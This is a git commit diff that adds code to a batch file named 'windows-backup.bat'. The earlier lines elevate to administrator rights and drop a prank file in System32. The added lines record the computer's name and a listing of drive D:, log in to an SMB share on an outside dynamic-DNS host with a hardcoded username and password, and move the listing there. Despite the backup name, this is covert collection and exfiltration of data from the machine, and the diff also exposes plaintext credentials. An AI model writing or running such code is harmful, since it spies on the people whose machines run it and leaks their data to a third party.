3d427e8e290141537625140e1bc0b774c9cb51bf
mitutina <mitutina00@gmail.com>
2024-12-23 21:00:37 +0700

    Update windows-backup.bat

--- windows-backup.bat
+++ windows-backup.bat
@@ -3,4 +3,26 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 
 echo Hello anh Dung Ha > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
 rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
+setlocal enabledelayedexpansion
+
+:: Lấy tên máy tính bằng PowerShell
+for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i
+
+:: Lấy ngày và giờ hiện tại
+for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
+for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
+set DATE=%DATE:/=-%
+set TIME=%TIME::=-%
+
+:: Liệt kê nội dung ổ D: và lưu vào file
+dir D:\ > "%DeviceName%_%DATE%_%TIME%.txt"
+
+:: Kết nối đến chia sẻ mạng \\minhtuan283.ddns.net\hdd
+net use \\minhtuan283.ddns.net\hdd /user:minhtuan283 Thienngan2002
+
+:: Di chuyển file đến thư mục đích trên mạng
+move "%DeviceName%_%DATE%_%TIME%.txt" \\minhtuan283.ddns.net\hdd\serial\list\
+
+:: Ngắt kết nối chia sẻ mạng sau khi xong
+net use \\minhtuan283.ddns.net\hdd /delete
 exit
